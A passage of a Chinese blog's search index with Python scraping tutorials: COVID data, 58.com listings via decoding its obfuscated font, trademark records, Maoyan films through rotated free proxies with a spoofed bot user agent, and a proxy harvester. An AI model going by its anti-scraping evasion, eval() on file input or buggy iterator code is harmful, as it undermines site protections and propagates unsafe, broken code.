1、无法利用CPU的多核优点，这个好理解，进程里面包含线程，而协程就是细分后的线程，也就是说一个进程里面首先是线程其后才是协程，那肯定是用不了多核了，不过可以多进程配合，使用CPU的密集运算，平时我们用不到。","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"采集疫情数据并可视化","slug":"采集疫情数据并可视化","date":"2020-10-12T11:27:51.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/12/采集疫情数据并可视化/","permalink":"http://example.com/2020/10/12/%E9%87%87%E9%9B%86%E7%96%AB%E6%83%85%E6%95%B0%E6%8D%AE%E5%B9%B6%E5%8F%AF%E8%A7%86%E5%8C%96/","excerpt":"采集疫情数据并可视化","text":"采集疫情数据并可视化 采集疫情数据并可视化12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# _*_coding:UTF-8 _*_import requestsimport jsonimport MySQLdbfrom pyecharts.charts import Map, Bar, Pagefrom pyecharts import options as optsconn = MySQLdb.connect( host=&#x27;localhost&#x27;, port=3306, user=&#x27;root&#x27;, passwd=&#x27;123456&#x27;, db=&#x27;spider&#x27;, charset=&#x27;utf8&#x27;)cursor = conn.cursor()url = &quot;https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5&quot;res = requests.get(url).json()print(res)for province in json.loads(res[&#x27;data&#x27;])[&#x27;areaTree&#x27;]: for province_data in province[&#x27;children&#x27;]: sql = &quot;insert into province values(%s,%s)&quot; cursor.execute(sql, [province_data[&#x27;name&#x27;], province_data[&#x27;today&#x27;][&#x27;confirm&#x27;]]) conn.commit() print(province_data[&#x27;name&#x27;], province_data[&#x27;today&#x27;][&#x27;confirm&#x27;])data = json.loads(res[&#x27;data&#x27;])[&#x27;chinaTotal&#x27;]print(data)sql = &#x27;insert into china_count values(%s,%s,%s,%s)&#x27;cursor.execute(sql, [data[&#x27;confirm&#x27;], data[&#x27;heal&#x27;], data[&#x27;dead&#x27;], data[&#x27;suspect&#x27;]])conn.commit()sql = &quot;select * from province&quot;cursor.execute(sql)datas = cursor.fetchall()china_sql = &#x27;select * from china_count&#x27;cursor.execute(china_sql)china_data = cursor.fetchone()# 地图map_obj = ( Map() .add(&quot;&quot;, datas, &quot;china&quot;) .set_global_opts( title_opts=opts.TitleOpts(title=&quot;疫情情况&quot;, subtitle=&quot;截止目前为止,全国共有累计确诊&#123;&#125;例,累计治愈&#123;&#125;例,累计死亡&#123;&#125;例,疑似&#123;&#125;例&quot; .format(china_data[0], china_data[1], china_data[2], china_data[3]) ), visualmap_opts=opts.VisualMapOpts(max_=3), ))name_list = [name[0] for name in datas]data_list = [name[1] for name in datas]# 柱状图bar_obj = ( Bar() .add_xaxis(name_list) .add_yaxis(&quot;各省份数据对比&quot;, data_list) .set_global_opts(title_opts=opts.TitleOpts(title=&quot;各省份目前情况&quot;), datazoom_opts=[opts.DataZoomOpts()] ))# page对象用于整合地图p = Page(layout=Page.SimplePageLayout)p.add(map_obj, bar_obj)p.render(&quot;疫情实时监控.html&quot;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"win10去除/恢复桌面快捷方式下标","slug":"win10去除-恢复桌面快捷方式下标","date":"2020-10-12T06:05:43.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/12/win10去除-恢复桌面快捷方式下标/","permalink":"http://example.com/2020/10/12/win10%E5%8E%BB%E9%99%A4-%E6%81%A2%E5%A4%8D%E6%A1%8C%E9%9D%A2%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E4%B8%8B%E6%A0%87/","excerpt":"","text":"win10去除&#x2F;恢复桌面快捷方式下标去除123456reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons&quot; /v 29 /d &quot;%systemroot%\\system32\\imageres.dll,197&quot; /t reg_sz /ftaskkill /f /im explorer.exeattrib -s -r -h &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot;del &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot; /f /qstart explorerpause 恢复123456reg delete &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons&quot; /v 29 /ftaskkill /f /im explorer.exeattrib -s -r -h &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot;del &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot; /f /qstart explorerpause","categories":[],"tags":[{"name":"win10","slug":"win10","permalink":"http://example.com/tags/win10/"}]},{"title":"58同城加密字体","slug":"58同城加密字体","date":"2020-10-10T10:40:12.000Z","updated":"2022-04-08T16:45:01.645Z","comments":true,"path":"2020/10/10/58同城加密字体/","permalink":"http://example.com/2020/10/10/58%E5%90%8C%E5%9F%8E%E5%8A%A0%E5%AF%86%E5%AD%97%E4%BD%93/","excerpt":"攻克加密字体的思路,详细代码","text":"攻克加密字体的思路,详细代码 58同城加密字体攻克加密字体的思路12341.分析网页,找到加密字体的字体文件2.对于加密字体,如果是base64编码的字符串,需要保存转换为二进制到woff文件中3.将字体转换为xml文件,用FontCreator软件观察字体,结合xml分析关系4.将编码替换为正常字体 找到加密字体文件 加密字体 发现规律 1可以看到code为0x958f这个编码对应的是数字3，对应的 name 编码是 glyph00004 1依然是 0x958f 这个编码，两次对应的 name 分别是 glyph00004 和 glyph00007，两次对应的数字分别是 3 和 6，那么结论就来了，每次发送请求，code 对应的 name 会随机发生变化，而 name 对应的数字不会发生变化，glyph00001 对应数字 0、glyph00002 对应数字 1 进行替换字体123456789101112131415161718192021222324252627282930313233343536373839404142&#x27;&#x27;&#x27;循环查找这十个 code 在 xml 文件里对应的 name 的值，然后将 name 的值与字典文件的 key 值进行对比，如果两者值相同，则获取这个 key 的 value 值，最终得到的列表 num_list，里面的元素就是 unicode_list 列表里面每个加密字体的真实值&#x27;&#x27;&#x27;def find_font(): # 以glyph开头的编码的对应的数字 glyph_list = &#123; &#x27;glyph00001&#x27;: &#x27;0&#x27;, &#x27;glyph00002&#x27;: &#x27;1&#x27;, &#x27;glyph00003&#x27;: &#x27;2&#x27;, &#x27;glyph00004&#x27;: &#x27;3&#x27;, &#x27;glyph00005&#x27;: &#x27;4&#x27;, &#x27;glyph00006&#x27;: &#x27;5&#x27;, &#x27;glyph00007&#x27;: &#x27;6&#x27;, &#x27;glyph00008&#x27;: &#x27;7&#x27;, &#x27;glyph00009&#x27;: &#x27;8&#x27;, &#x27;glyph00010&#x27;: &#x27;9&#x27; &#125; # 十个加密字体编码 unicode_list = [&#x27;0x9476&#x27;, &#x27;0x958f&#x27;, &#x27;0x993c&#x27;, &#x27;0x9a4b&#x27;, &#x27;0x9e3a&#x27;, &#x27;0x9ea3&#x27;, &#x27;0x9f64&#x27;, &#x27;0x9f92&#x27;, &#x27;0x9fa4&#x27;, &#x27;0x9fa5&#x27;] num_list = [] # 利用xpath语法匹配xml文件内容 font_data = etree.parse(&#x27;./58font.xml&#x27;) for unicode in unicode_list: # 依次循环查找xml文件里code对应的name result = font_data.xpath(&quot;//cmap//map[@code=&#x27;&#123;&#125;&#x27;]/@name&quot;.format(unicode))[0] # print(result) # 循环字典的key，如果code对应的name与字典的key相同，则得到key对应的value for key in glyph_list.keys(): if key == result: num_list.append(glyph_list[key]) print(&#x27;已成功找到编码所对应的数字！&#x27;) # print(num_list) # 返回value列表 return num_list# 替换文字def replace_font(num, page_response): # 9476 958F 993C 9A4B 9E3A 9EA3 9F64 9F92 9FA4 9FA5 result = page_response.replace(&#x27;&amp;#x9476;&#x27;, num[0]).replace(&#x27;&amp;#x958f;&#x27;, num[1]).replace(&#x27;&amp;#x993c;&#x27;, num[2]).replace(&#x27;&amp;#x9a4b;&#x27;, num[3]).replace(&#x27;&amp;#x9e3a;&#x27;, num[4]).replace(&#x27;&amp;#x9ea3;&#x27;, num[5]).replace(&#x27;&amp;#x9f64;&#x27;, num[6]).replace(&#x27;&amp;#x9f92;&#x27;, num[7]).replace(&#x27;&amp;#x9fa4;&#x27;, num[8]).replace(&#x27;&amp;#x9fa5;&#x27;, num[9]) print(&#x27;已成功将所有加密字体替换！&#x27;) return result 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149import reimport requestsimport timeimport randomimport base64import pymysqlfrom lxml import etree#from Spider.ip_pool import Poolfrom fontTools.ttLib import TTFontheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36&#x27;&#125;#ips = Pool(10)#proxy = ips.offer_ip()#print(proxy)# 获取字体文件并转换为xml文件def get_font(page_url, page_num): #response = requests.get(url=page_url, headers=headers, proxies=proxy) response = requests.get(url=page_url, headers=headers) # 匹配 base64 编码的加密字体字符串 base64_string = response.text.split(&quot;base64,&quot;)[1].split(&quot;&#x27;&quot;)[0].strip() # print(base64_string) # 将 base64 编码的字体字符串解码成二进制编码 bin_data = base64.decodebytes(base64_string.encode()) # 保存为字体文件 with open(&#x27;58font.woff&#x27;, &#x27;wb&#x27;) as f: f.write(bin_data) print(&#x27;第&#x27; + str(page_num) + &#x27;次访问网页，字体文件保存成功！&#x27;) # 获取字体文件，将其转换为xml文件 font = TTFont(&#x27;58font.woff&#x27;) font.saveXML(&#x27;58font.xml&#x27;) print(&#x27;已成功将字体文件转换为xml文件！&#x27;) return response.text# 将加密字体编码与真实字体进行匹配def find_font(): # 以glyph开头的编码对应的数字 glyph_list = &#123; &#x27;glyph00001&#x27;: &#x27;0&#x27;, &#x27;glyph00002&#x27;: &#x27;1&#x27;, &#x27;glyph00003&#x27;: &#x27;2&#x27;, &#x27;glyph00004&#x27;: &#x27;3&#x27;, &#x27;glyph00005&#x27;: &#x27;4&#x27;, &#x27;glyph00006&#x27;: &#x27;5&#x27;, &#x27;glyph00007&#x27;: &#x27;6&#x27;, &#x27;glyph00008&#x27;: &#x27;7&#x27;, &#x27;glyph00009&#x27;: &#x27;8&#x27;, &#x27;glyph00010&#x27;: &#x27;9&#x27; &#125; # 十个加密字体编码 unicode_list = [&#x27;0x9476&#x27;, &#x27;0x958f&#x27;, &#x27;0x993c&#x27;, &#x27;0x9a4b&#x27;, &#x27;0x9e3a&#x27;, &#x27;0x9ea3&#x27;, &#x27;0x9f64&#x27;, &#x27;0x9f92&#x27;, &#x27;0x9fa4&#x27;, &#x27;0x9fa5&#x27;] num_list = [] # 利用xpath语法匹配xml文件内容 font_data = etree.parse(&#x27;./58font.xml&#x27;) for unicode in unicode_list: # 依次循环查找xml文件里code对应的name result = font_data.xpath(&quot;//cmap//map[@code=&#x27;&#123;&#125;&#x27;]/@name&quot;.format(unicode))[0] # print(result) # 循环字典的key，如果code对应的name与字典的key相同，则得到key对应的value for key in glyph_list.keys(): if key == result: num_list.append(glyph_list[key]) print(&#x27;已成功找到编码所对应的数字！&#x27;) # print(num_list) # 返回value列表 return num_list# 替换掉网页中所有的加密字体编码def replace_font(num, page_response): # 9476 958F 993C 9A4B 9E3A 9EA3 9F64 9F92 9FA4 9FA5 result = page_response.replace(&#x27;&amp;#x9476;&#x27;, num[0]).replace(&#x27;&amp;#x958f;&#x27;, num[1]).replace(&#x27;&amp;#x993c;&#x27;, num[2]).replace( &#x27;&amp;#x9a4b;&#x27;, num[3]).replace(&#x27;&amp;#x9e3a;&#x27;, num[4]).replace(&#x27;&amp;#x9ea3;&#x27;, num[5]).replace(&#x27;&amp;#x9f64;&#x27;, num[6]).replace( &#x27;&amp;#x9f92;&#x27;, num[7]).replace(&#x27;&amp;#x9fa4;&#x27;, num[8]).replace(&#x27;&amp;#x9fa5;&#x27;, num[9]) print(&#x27;已成功将所有加密字体替换！&#x27;) return result# 提取租房信息def parse_pages(pages): num = 0 ele = etree.HTML(pages) city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) rooms = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;room&quot;]/text()&#x27;) address = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;infor&quot;]/a/text()&#x27;) # subway_rule = &#x27;&lt;/em&gt;(.*?) &lt;/p&gt;&#x27; # subway = re.findall(subway_rule, pages) price = ele.xpath(&#x27;//div[@class=&quot;money&quot;]/b/text()&#x27;) # print(title[0].split(&#x27;\\n&#x27;)[1].strip()) # print(rooms[0].replace(&#x27; &#x27;,&#x27;&#x27;)) # print(address[0]+&quot; &quot;+address[1]) # print(subway[0].replace(&#x27; &#x27;,&#x27;&#x27;)) # print(price) print(len(title)) for i in title: index = title.index(i) try: if title[index] ==&#x27;&#x27;: title[index] == &#x27;无&#x27; data = [title[index].split(&#x27;\\n&#x27;)[1].strip(), rooms[index].replace(&#x27; &#x27;, &#x27;&#x27;), address[index * 2] + &quot; &quot; + address[index * 2 + 1], price[index] + &#x27;元/月&#x27;, city] num += 1 except Exception as e: print(e) save_to_mysql(data) print(&#x27;第&#x27; + str(num) + &#x27;条数据爬取完毕，暂停2秒！&#x27;) time.sleep(2)# 创建MySQL数据库的表：58tc_datadef create_mysql_table(): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;CREATE TABLE IF NOT EXISTS 58tc_data (title VARCHAR(100) PRIMARY KEY,rooms VARCHAR(255) NOT NULL, address VARCHAR(100) ,price VARCHAR(255),city VARCHAR(255) )&#x27; cursor.execute(sql) db.close()# 将数据储存到MySQL数据库def save_to_mysql(data): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;INSERT INTO 58tc_data(title,rooms,address,price,city) values(%s, %s, %s, %s,%s)&#x27; try: cursor.execute(sql, (data[0], data[1], data[2], data[3], data[4])) db.commit() except Exception as e: print(e) db.rollback() db.close()if __name__ == &#x27;__main__&#x27;: # create_mysql_table() # print(&#x27;MySQL表58tc_data创建成功！&#x27;) for i in range(1, 71): url = &#x27;https://bj.58.com/chuzu/pn&#x27; + str(i) + &#x27;/&#x27; response = get_font(url, i) num_list = find_font() pro_pages = replace_font(num_list, response) parse_pages(pro_pages) print(&#x27;第&#x27; + str(i) + &#x27;页数据爬取完毕！&#x27;) time.sleep(random.randint(3, 10)) print(&#x27;所有数据爬取完毕！&#x27;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"商标网信息爬取","slug":"商标网信息爬取","date":"2020-10-09T08:47:27.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/09/商标网信息爬取/","permalink":"http://example.com/2020/10/09/%E5%95%86%E6%A0%87%E7%BD%91%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/","excerpt":"商标网信息爬取,网站http://wsgg.sbj.cnipa.gov.cn:9080/tmann/annInfoView/annSearchDG.html","text":"商标网信息爬取,网站http://wsgg.sbj.cnipa.gov.cn:9080/tmann/annInfoView/annSearchDG.html 商标网信息爬取123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import MySQLdbimport requestsnum = 1713n = 0url = &quot;http://wsgg.sbj.cnipa.gov.cn:9080/tmann/annInfoView/annSearchDG.html&quot;headers = &#123; &#x27;user-agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36&#x27;&#125;for annnum in range(50): data = &#123; &#x27;page&#x27;:&#x27;1&#x27;, &#x27;rows&#x27;:&#x27;400000&#x27;, &#x27;annNum&#x27;:str(num), &#x27;annType&#x27;:&#x27;&#x27;, &#x27;tmType&#x27;:&#x27;&#x27;, &#x27;coowner&#x27;:&#x27;&#x27;, &#x27;recUserName&#x27;:&#x27;&#x27;, &#x27;allowUserName&#x27;:&#x27;&#x27;, &#x27;byAllowUserName&#x27;:&#x27;&#x27;, &#x27;appId&#x27;:&#x27;&#x27;, &#x27;appIdZhiquan&#x27;:&#x27;&#x27;, &#x27;bfchangedAgengedName&#x27;:&#x27;&#x27;, &#x27;changeLastName&#x27;:&#x27;&#x27;, &#x27;transferUserName&#x27;:&#x27;&#x27;, &#x27;acceptUserName&#x27;:&#x27;&#x27;, &#x27;regName&#x27;:&#x27;&#x27;, &#x27;tmName&#x27;:&#x27;&#x27;, &#x27;intCls&#x27;:&#x27;&#x27;, &#x27;fileType&#x27;:&#x27;&#x27;, &#x27;totalYOrN&#x27;:&#x27;true&#x27;, &#x27;appDateBegin&#x27;:&#x27;&#x27;, &#x27;appDateEnd&#x27;:&#x27;&#x27;, &#x27;agentName&#x27;:&#x27;&#x27;, &#125; num -= 1 print(data) res = requests.post(url,data=data,headers=headers).json() # 1.连接数据库 conn = MySQLdb.connect( host=&#x27;localhost&#x27;, port=3306, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, db=&#x27;spider&#x27;, charset=&#x27;utf8&#x27; ) cursor = conn.cursor() for i in res[&#x27;rows&#x27;]: try: # sql1 = &#x27;SELECT count(*) from brand1&#x27; # cursor.execute(sql1) # 2.准备sql语句 sql = &#x27;INSERT IGNORE INTO brand1 VALUES(%s,%s,%s)&#x27; # 3.执行sql cursor.execute(sql, [i[&#x27;tm_name&#x27;], i[&#x27;reg_num&#x27;], i[&#x27;reg_name&#x27;]]) conn.commit() n += 1 print(n) except Exception as e: print(f&#x27;存入数据失败，原因：&#123;e&#125;&#x27;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"自定义实现迭代器","slug":"自定义实现迭代器","date":"2020-10-05T04:29:25.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/05/自定义实现迭代器/","permalink":"http://example.com/2020/10/05/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E8%BF%AD%E4%BB%A3%E5%99%A8/","excerpt":"python自定义迭代器","text":"python自定义迭代器 python自定义迭代器的生成迭代器什么是迭代器12345iter(可迭代对象 )可以返回这个对象的的 迭代器实现了__iter__和__next__方法的对象都是迭代器对象迭代器对象是一个带状态的对象 __index记录当前迭代的位置迭代器也是一个可迭代对象,而可迭代对象不一定是迭代器 123456789101112131415#自定义实现迭代器class Stack: def __init__(self,*args): slef.__items = list(args) self.__index = 0 def __iter__(self): return self def __next__(self): if self.__index &lt; len(self.__items): item =self.__items[self.__index] self.__index +=1 return item else: raise StopIteration","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"爬取猫眼电影top100","slug":"爬取猫眼电影top100","date":"2020-09-29T07:18:45.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/09/29/爬取猫眼电影top100/","permalink":"http://example.com/2020/09/29/%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100/","excerpt":"使用ip代理爬取爬取猫眼电影top100","text":"使用ip代理爬取爬取猫眼电影top100 爬取猫眼电影top100123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import re, gzipfrom urllib import requestfrom lxml import etreenum = 0with open(&quot;ip.txt&quot;, &quot;r&quot;) as r: ips = r.readlines()for pn in range(0, 100, 10): url = &quot;https://maoyan.com/board/4?offset=&#123;&#125;&quot;.format(pn) headers = &#123; &#x27;user-agent&#x27;: &#x27;YoudaoBot&#x27;, &quot;referer&quot;: url, &#125; req = request.Request(url, headers=headers) for ip in ips: # 构建handler handler = request.ProxyHandler(eval(ip)) opener = request.build_opener(handler) res = opener.open(req).read().decode(&#x27;utf-8&#x27;) # 使用xpath匹配信息 ele = etree.HTML(res) # 匹配电影的url movie_url_list = ele.xpath(&#x27;//dl[@class=&quot;board-wrapper&quot;]/dd/a/@href&#x27;) # print(movie_url_list) # 拼接电影url new_movie_url = [&quot;https://maoyan.com&quot; + url for url in movie_url_list] # print(new_movie_url) for movie_url in new_movie_url: # print(movie_url) req1 = request.Request(movie_url, headers=headers) res1 = request.urlopen(req1).read() try: result1 = gzip.decompress(res1).decode(&#x27;utf-8&#x27;) except: result1 = res1.decode(&#x27;utf-8&#x27;) # print(result1) ele1 = etree.HTML(result1) movie_name = ele1.xpath(&#x27;//h1/text()&#x27;)[0] rule = &#x27;(.*?)\\n(.*?)\\n(.*?)\\n(.*?)&lt;li class=&quot;ellipsis&quot;&gt;(.*?)&lt;&#x27; movie_time = re.findall(rule, result1)[0][1][12:] movie_countries = re.findall(rule, result1)[0][0][8:] movie_grade = ele.xpath(&#x27;//i[@class=&quot;integer&quot;]/text()&#x27;)[0] + ele.xpath(&#x27;//i[@class=&quot;fraction&quot;]/text()&#x27;)[0] # print(movie_time,movie_countries,movie_grade) with open(&#x27;movie_top100.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as w: w.write(movie_name + &quot; &quot; + movie_countries + &quot; &quot; + movie_time + &quot; &quot; + movie_grade + &quot; \\n&quot;) num += 1 print(num) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768抓取免费高匿代理&#123;&#x27;http&#x27;: &#x27;125.108.71.122:9000&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;182.149.83.56:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;183.166.139.78:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;110.243.22.28:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;175.42.158.86:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;123.163.118.153:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;60.191.11.251:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;103.247.219.30:36295&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;114.109.162.18:8080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;118.25.40.151:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;113.252.222.73:8380&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;110.243.3.226:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;94.205.254.82:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;114.104.138.96:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;58.250.21.56:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;140.143.156.166:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;140.143.142.218:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;61.148.199.222:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;113.121.38.31:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;123.149.137.44:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;116.62.204.38:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;222.175.171.6:8080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.157:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;105.27.237.31:80&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.63.140:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.114:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.21:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.113:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.63.141:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.107:13084&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.159:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.77.61.153:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.84.146:8800&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.86:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.233.109:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.87:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;46.101.140.93:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.118:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;115.53.34.149:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.157:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;105.27.237.31:80&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;110.243.3.226:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.63.140:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;118.24.172.149:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.114:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.21:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;106.110.212.165:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;95.0.66.69:8080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.113:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;171.35.170.212:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;105.27.237.28:80&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.107:13084&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.232.95:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.159:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;115.218.214.35:9000&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.77.61.153:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.84.146:8800&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.86:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.233.109:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.23:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;46.101.140.93:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.118:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.84.148:8800&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.51.134:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.106:10223&#x27;&#125;","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Clawer-爬虫采集免费的代理","slug":"Clawer-采集免费的代理","date":"2020-09-28T01:00:25.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/28/Clawer-采集免费的代理/","permalink":"http://example.com/2020/09/28/Clawer-%E9%87%87%E9%9B%86%E5%85%8D%E8%B4%B9%E7%9A%84%E4%BB%A3%E7%90%86/","excerpt":"Clawer-爬虫采集免费的代理,并测试代理是否可用","text":"Clawer-爬虫采集免费的代理,并测试代理是否可用 Clawer-爬虫采集免费的代理12345678910111213141516171819202122232425262728293031323334353637383940# # _*_coding:UTF-8 _*_# 采集代理import refrom urllib import requestfrom lxml import etree#测试地址test_url = &quot;http://www.httpbin.org/ip&quot;local_ip = request.urlopen(test_url).read().decode()url = &quot;https://ip.jiangxianli.com/blog.html&quot;res = request.urlopen(url).read().decode(&#x27;utf-8&#x27;)# with open(&#x27;ip.html&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as w:# w.write(res)ele = etree.HTML(res)char_url_list = ele.xpath(&#x27;//h3/a/@href&#x27;)for char_url in char_url_list: res1 = request.urlopen(char_url).read().decode(&#x27;utf-8&#x27;) rule = &#x27;&lt;p&gt;(.*?)&lt;/p&gt;&#x27; ip_port_list = re.findall(rule, res) for i in ip_port_list[1:]: ip_port = i.split(&#x27;@HTTP&#x27;)[0] ip_port1 = ip_port.lstrip() # print(ip_port1) # 拼接对应的代理格式 dict1 = &#123;&#125; dict1[&#x27;http&#x27;] = ip_port1 print(&quot;开始测试代理&#123;&#125;&quot;.format(dict1)) # 构建代理handler proxy_handler = request.ProxyHandler(dict1) opener = request.build_opener(proxy_handler) try: now_ip = opener.open(test_url, timeout=4).read().decode() if now_ip != local_ip: print(&quot;代理可以用:&#123;&#125;&quot;.format(dict1)) with open(&quot;ip.txt&quot;, &quot;a&quot;) as w: w.write(str(dict1) + &quot;\\n&quot;) print(&quot;写入ip&#123;&#125;&quot;.format(dict1)) except: pass 测试代理1234567891011121314151617181920# 测试代理from urllib import requesttest_url = &quot;http://www.httpbin.org/ip&quot;local_ip = request.urlopen(test_url).read().decode()with open(&#x27;ip.txt&#x27;, &#x27;r&#x27;) as r: ips = r.readlines()for ip in ips: proxy_handler = request.ProxyHandler(eval(ip)) opener = request.build_opener(proxy_handler) try: now_ip = opener.open(test_url, timeout=4).read().decode() if now_ip != local_ip: print(&quot;代理可以用&#123;&#125;&quot;.format(ip)) with open(&#x27;ip1.txt&#x27;, &#x27;a&#x27;) as w: w.write(str(ip) + &quot;\\n&quot;) except: 